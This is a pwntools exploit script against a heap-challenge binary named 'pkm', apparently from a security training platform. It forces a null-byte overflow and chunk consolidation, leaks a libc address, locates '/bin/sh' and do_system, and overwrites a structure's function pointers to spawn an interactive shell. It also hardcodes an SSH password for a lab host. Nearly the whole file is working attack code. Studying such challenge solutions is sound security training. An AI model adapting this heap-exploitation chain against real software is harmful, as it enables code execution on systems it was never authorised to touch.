from pwn import *
import sys
import os

libc=ELF("./libc-2.27_notcache.so")
bin=ELF("./pkm_nopie_patched")

context.binary = bin
context.terminal = ['tmux', 'splitw', '-h']

free=[0]*50
def find_index():
    global free
    for i in range(50):
        if(free[i]==0):
            return i
def new():
    global free
    p.recvuntil(b">")
    try:
        p.sendline(b"0")
    except:
        print("Error new")
    index=find_index()
    free[index]=1
    return index
def rename(i,size,content):
    p.recvuntil(b">")
    try:
        p.sendline(b"1")
        p.sendline(b"%d"%i)
        p.recvuntil(b":")
        p.sendline(b"%d"%size)
        p.send(content)
    except:
        print("Error writing")
def delete(i):
    global free
    try:
        p.recvuntil(b">")
        p.sendline(b"2")
        p.recvuntil(b">")
        p.sendline(b"%d"%i)
        free[i]=1
    except:
        print("Errore delete")

def info(i):
    p.recvuntil(b">")
    try:
        p.sendline(b"4")
        p.recvuntil(b">")
        p.sendline(b"%d"%i)
        line=p.recvline()
        name=line[9:-1]
        line=p.recvline()
        attack=line[8:-1]
        return {"name": name, "attack":attack}
    except:
        print("Errore free")
    return name

######################################################################
## PLEASE PAY ATTENTION THAT THE FUCKING BINARY WANTS THE LIB inside home/acidburn
## other references will NOT work

index=-1

if sys.argv[1]== "nc":
    p=remote("bin.training.jinblack.it",2025)
else:
    ## Breakpoints
    # start of new 0x401451
    # end of new() 0x401492
    # start_rename 0x4015bf
    # start_get_pkm 0x40152b
    # end_rename 0x40166e
    # start_delete 0x401709 (free)
    # end_delete 0x401780
    # end_info 0x401ba7
    #p=process("./pkm")
    host = "acidburn"
    ip = "127.0.0.1"

    category = "heap"
    proc = "pkm"
    path = "/challenges/"+category+"/"+proc+"/"
    #prt = int(input(" insert "+host+"'s port to connect to:"))
    prt=3022
    #pwd = getpass("insert "+host+"'s password:")
    pwd="0607991337"
    process = "."+path+proc+"_nopie"
    print("Connecting to "+host+" at "+ip+" to execute syscall")
    ssh_p = ssh(host,ip,password=pwd,port= prt)
    if sys.argv[1]=="gdb":

        gdbc = """
                    start
                    b *0x401451
                    b *0x401492
                    b *0x4015bf
                    b *0x40152b
                    b *0x40166e
                    b *0x401709
                    b *0x401780
                    b *0x401ba7
                    c
                """
        p = gdb.debug( [process], ssh = ssh_p, gdbscript = gdbc )

    else:
        gdbc = """
                    start
                    b *0x401b8f
                    b *0x401a0f
                    c
               """
        #p = gdb.debug( [process], ssh = ssh_p, gdbscript = gdbc )
        p = ssh_p.process([process+"_patched"])




# PKM_base
chunk_base=new()
# PKM_0
chunk_A=new()
rename(chunk_A,0x40,b"aaaaaaaaaaaaa\n")#13 a's + /n
# PKM_1
chunk_B=new()
# Name_PKM0
rename(chunk_base,0x28,b"a\n")
# PKM_2
chunk_C=new()

#Overwrite chunk C (Null poison)
rename(chunk_base,0x28, b"a"*0x20+p64(0x280))

#Add for not consolidate the Top Chunk
chunk_off=new()

#Add to unsorted bins to avoid checks
delete(chunk_A)##with this I have already main_arena+96 into 0x405110

#Consolidate with A
delete(chunk_C)
#leaking
rename(chunk_B,0x40,b"aaaaaaa\n")
chunk_over_A=new()##This chunk must be of the same size of the original A chunk
leaked=u64(info(chunk_B)["name"]+b"\x00\x00")
log.info("[*] Leaked: %#x" % leaked)
libc_base=leaked-4074624#is this guy correct ?
log.info("[*] Libc: %#x" % libc_base)
libc.address=libc_base

#The leak works as such we need to do a proper exploit
sh=libc.search(b"/bin/sh\x00")
log.info(f"sh::: {sh}")
bin_sh=next(sh)##what does this do ????
log.info(f"bin_sh::: {hex(bin_sh)}")
system=libc.symbols["do_system"]
log.info(f"system::: {hex(system)}")

#payload_over_B=p64(0x28)+p64(0xa)
#              +p64(0x65)+p64(0x65)
#              +p64(0x0)+p64(bin_sh)
#              +p64(0x1)+p64(0x0)*5
#              +p64(bin_sh)+p64(system_addr)
### 00: 0x0000000000000028 0x000000000000000f
### 10: 0x0000000000000064 0x0000000000000064
### 20: 0xbin_sh\x00...... 0x0000000000000001
### 30: 0x0000000000000000 0x0000000000000000
### 40: 0x0000000000000000 0x0000000000000000
### 50: 0x0000000000000000 0xbin_sh\x00......
### 60: 0xsystem.......... ..................
offset = p64(0x00)*8
payload_over_B=offset+p64(0x0)+p64(0x101)+p64(0x2F62696E2F736800)+p64(0xf)#atk and def
payload_over_B+=p64(0x69)+p64(0x70)#hp and max hp
payload_over_B+=p64(0x00)+p64(0x405360)#null and ptr to string name
payload_over_B+=p64(0x2)+p64(0x0)
payload_over_B+=p64(0x0)+p64(0x0)
payload_over_B+=p64(system)+p64(system)
#0x2F62696E2F736800
payload_over_B+=p64(system)+p64(system)
#payload_over_B+=p64(system)+p64(system)
#payload_over_B+=p64(system)+p64(system)
#payload_over_B+=p64(system)+p64(system)
#payload_over_B+=p64(0x0)*4


rename(4,0x140,payload_over_B)#
 #p.sendline(b"")

#p.sendline(b"3")
#p.sendline(b"0")
#p.sendline(b"1")
#p.sendline(b"0")
p.interactive()
